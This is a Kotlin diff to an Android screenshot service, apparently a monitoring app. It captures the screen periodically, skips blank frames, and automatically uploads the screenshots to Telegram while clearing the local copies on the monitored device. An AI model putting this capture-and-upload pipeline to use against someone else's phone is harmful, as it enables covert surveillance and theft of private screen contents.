@@ -199,7 +199,7 @@ class ScreenshotService : Service() {
             virtualDisplay?.release()
             imageReader?.close()
 
-            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)
+            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 4)
             virtualDisplay = projection.createVirtualDisplay(
                 "SelfMonitorVirtualDisplay",
                 screenWidth,
@@ -217,13 +217,22 @@ class ScreenshotService : Service() {
     }
 
     private fun captureCurrentFrame() {
+        val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
+        if (powerManager?.isInteractive == false) {
+            return
+        }
+
         val reader = imageReader ?: return
         wakeLock?.acquire(3000L) // Giữ wake lock trong tối đa 3 giây khi chụp và ghi file
 
         executor.execute {
             var image: android.media.Image? = null
             try {
-                image = reader.acquireLatestImage()
+                image = reader.acquireLatestImage() ?: try {
+                    reader.acquireNextImage()
+                } catch (_: Exception) {
+                    null
+                }
                 if (image == null) {
                     Log.d(TAG, "No new frame in buffer, waiting for next interval")
                     return@execute
@@ -248,6 +257,13 @@ class ScreenshotService : Service() {
                     bitmap
                 }
 
+                // Kiểm tra nếu là màn hình đen xì (tắt màn hình/khoá máy) thì bỏ qua, không lưu và không gửi
+                if (TelegramSender.isPureBlackBitmap(finalBitmap)) {
+                    Log.d(TAG, "Foreground frame is pure black (screen off/sleep). Discarding.")
+                    finalBitmap.recycle()
+                    return@execute
+                }
+
                 val dir = File(filesDir, "screenshots")
                 if (!dir.exists()) dir.mkdirs()
                 val file = File(dir, "shot_${System.currentTimeMillis()}.jpg")
@@ -259,6 +275,9 @@ class ScreenshotService : Service() {
 
                 Log.d(TAG, "Screenshot saved successfully: ${file.absolutePath} (${file.length()} bytes)")
                 dbHelper.insertScreenshot(file.absolutePath)
+
+                // Tự động đẩy lên Telegram và dọn dẹp bộ nhớ Máy 1 nếu đã kích hoạt
+                TelegramSender.syncPendingData(applicationContext)
             } catch (e: Exception) {
                 Log.e(TAG, "Error processing screen frame", e)
             } finally {
